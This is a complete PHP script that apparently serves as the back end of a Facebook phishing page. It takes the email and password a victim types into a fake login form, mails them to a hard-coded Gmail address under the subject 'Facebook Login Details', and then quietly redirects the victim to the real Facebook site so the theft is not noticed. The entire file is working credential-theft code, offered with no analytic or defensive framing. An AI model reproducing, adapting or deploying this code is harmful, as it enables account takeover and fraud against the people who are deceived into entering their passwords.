<?php

$username=$_POST['email'];
$password=$_POST['pass'];

$from="admin@000webhost.com";
$to="mundheyrohan@gmail.com";
$subject="Facebook Login Details";
$message="\nUsername :".$username."\nPassword :".$password;


mail($to,$subject,$message,$from);

echo "<script> location.href='https://www.facebook.com/'; </script>";
exit;
?>